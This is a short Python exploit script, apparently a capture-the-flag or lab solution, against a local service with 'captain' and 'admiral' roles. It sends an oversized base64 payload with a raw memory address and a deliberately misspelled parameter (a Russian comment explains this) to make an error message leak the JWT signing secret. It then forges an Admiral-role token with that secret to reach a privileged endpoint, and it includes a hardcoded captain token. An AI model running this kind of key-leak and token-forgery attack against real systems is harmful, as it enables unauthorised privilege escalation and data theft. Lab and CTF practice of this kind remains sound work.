import requests
import base64
import jwt

secret_key_address  = b"\x50\xee\x6b\x6b\x91\x58\x00\x00"
server_addr = "http://localhost:8080"
change_description = "/captain/change_sailor_description"
get_all_missions = "/admiral/get_all_missions"
captain_token = "eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NDU5NDMwNjUsImZpcnN0bmFtZSI6ImNhcHRhaW4iLCJpYXQiOjE3NDU4NTY2NjUsImlzcyI6ImF1dGhfc2VydmljZSIsInJvbGUiOiJDYXB0YWluIiwic2Vjb25kbmFtZSI6ImNhcHRhaW4iLCJ0aGlyZG5hbWUiOiJjYXB0YWluIn0.E-DWdZ3ueyteOC-Q1LbkHZk6PcfMJr17joipxx3NCc8"
admiral_creds = {}

payload = b"a" * 200 + secret_key_address
payload = base64.b64encode(payload)
payload = payload.decode('utf-8')
data = {"new_description": payload,"sailor_ida": 4} # надо указать неправильное имя параметра чтобы получить ошибку.
headers = {"Authorization": captain_token}

response = requests.post(url=server_addr+change_description, json=data, headers=headers)

sign_token = base64.b64decode(response.json()["message"]).split(b"cannot find key: sailor_id")[0]
sign_token = sign_token.decode('utf-8')
ALGORITHM = "HS256"
PAYLOAD = {
  "exp": 1745943065,
  "firstname": "admiral",
  "iat": 1745856665,
  "iss": "auth_service",
  "role": "Admiral",
  "secondname": "admiral",
  "thirdname": "admiral"
}

encoded_jwt = jwt.encode(PAYLOAD, sign_token, algorithm=ALGORITHM)
headers = {"Authorization": encoded_jwt}
response = requests.get(url=server_addr+get_all_missions, headers=headers)

print(response.json())